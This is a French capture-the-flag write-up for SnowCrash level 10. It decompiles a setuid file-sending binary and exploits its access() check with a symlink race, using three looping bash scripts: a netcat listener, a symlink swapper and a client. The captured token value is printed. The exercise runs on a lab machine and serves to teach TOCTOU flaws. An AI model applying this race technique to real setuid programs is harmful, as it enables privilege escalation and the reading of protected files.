
# **Level 10**

Pour le level10, on a un executable et un fichier `token` dans le repertoire courant


```
level10@SnowCrash:~$ ls -l
total 16
-rwsr-sr-x+ 1 flag10 level10 10817 Mar  5  2016 level10
-rw-------  1 flag10 flag10     26 Mar  5  2016 token
```

On decompile l'executable pour voir ce qu'il fais
```
int main(int argc,char **argv)

{
  char *__cp;
  uint16_t uVar1;
  int iVar2;
  int iVar3;
  ssize_t sVar4;
  size_t __n;
  int *piVar5;
  char *pcVar6;
  int in_GS_OFFSET;
  char *file;
  char *host;
  int fd;
  int ffd;
  int rc;
  char buffer [4096];
  sockaddr_in sin;
  undefined local_1024 [4096];
  sockaddr local_24;
  int local_14;
  
  local_14 = *(int *)(in_GS_OFFSET + 0x14);
  if (argc < 3) {
    printf("%s file host\n\tsends file to host if you have access to it\n",*argv);
                    // WARNING: Subroutine does not return
    exit(1);
  }
  pcVar6 = argv[1];
  __cp = argv[2];
  iVar2 = access(argv[1],4);
  if (iVar2 == 0) {
    printf("Connecting to %s:6969 .. ",__cp);
    fflush(stdout);
    iVar2 = socket(2,1,0);
    local_24.sa_data._2_4_ = 0;
    local_24.sa_data._6_4_ = 0;
    local_24.sa_data._10_4_ = 0;
    local_24._0_4_ = 2;
    local_24.sa_data._2_4_ = inet_addr(__cp);
    uVar1 = htons(0x1b39);
    local_24._0_4_ = local_24._0_4_ & 0xffff | (uint)uVar1 << 0x10;
    iVar3 = connect(iVar2,&local_24,0x10);
    if (iVar3 == -1) {
      printf("Unable to connect to host %s\n",__cp);
                    // WARNING: Subroutine does not return
      exit(1);
    }
    sVar4 = write(iVar2,".*( )*.\n",8);
    if (sVar4 == -1) {
      printf("Unable to write banner to host %s\n",__cp);
                    // WARNING: Subroutine does not return
      exit(1);
    }
    printf("Connected!\nSending file .. ");
    fflush(stdout);
    iVar3 = open(pcVar6,0);
    if (iVar3 == -1) {
      puts("Damn. Unable to open file");
                    // WARNING: Subroutine does not return
      exit(1);
    }
    __n = read(iVar3,local_1024,0x1000);
    if (__n == 0xffffffff) {
      piVar5 = __errno_location();
      pcVar6 = strerror(*piVar5);
      printf("Unable to read from file: %s\n",pcVar6);
                    // WARNING: Subroutine does not return
      exit(1);
    }
    write(iVar2,local_1024,__n);
    iVar2 = puts("wrote file!");
  }
  else {
    iVar2 = printf("You don\'t have access to %s\n",pcVar6);
  }
  if (local_14 != *(int *)(in_GS_OFFSET + 0x14)) {
                    // WARNING: Subroutine does not return
    __stack_chk_fail();
  }
  return iVar2;
}
```

L'executable essaye d'ouvrir le fichier en parametre pour envoyer son contenu a un serveur dont l'host est passer en parametre passant par le port `6969`, pour ca il utilise access pour verifier qu'il a droit d'ouvrir le fichier

Avec nos recherches nous avons trouve une faille sur access
[Exploit access with symlink](https://mirror.xyz/0x512e8a35C72F08caD58c50352f567971df8294f7/HeTWxEZ6EUkQHwb8JALSHnNwXGZUVAE5FtPjM5_q5jU)

Pour l'exploiter nous utilisons `trois` script bash

### server.sh
Le premier nous permet d'ouvrir un serveur qui va ecouter sur localhost:6969

```
while true; do
    nc -l 6969

done
```

### symlink.sh

Le second va nous permettre de changer en boucle la destination d'un lien symbolique pour alternativement le faire pointer sur `token` puis sur `allowedfile` un fichier sur lequel on possede les droits

> level10@SnowCrash:/var/crash$ touch allowedfile

```
while true; do
    ln -sfn /var/crash/allowedfile /var/crash/level10
    ln -sfn /home/user/level10/token /var/crash/level10

done
```

### client.sh
Et enfin le dernier va nous permettre d'appeler l'executable en indiquant en parametre le lien symbolique et `127.0.0.1` comme host

```
while true; do
    /home/user/level10/level10 /var/crash/level10 127.0.0.1

done
```

Et une fois ces trois scripts lances, si nous allons dans l'output du serveur

```
level10@SnowCrash:/var/crash$ sh server.sh
.*( )*.
woupa2yuojeeaaed06riuj63c
.*( )*.
woupa2yuojeeaaed06riuj63c
.*( )*.
woupa2yuojeeaaed06riuj63c
.*( )*.
woupa2yuojeeaaed06riuj63c
.*( )*.
woupa2yuojeeaaed06riuj63c
.*( )*.
^C
```

> ### NEXT : [Level 11](/level11/resources/README.md)
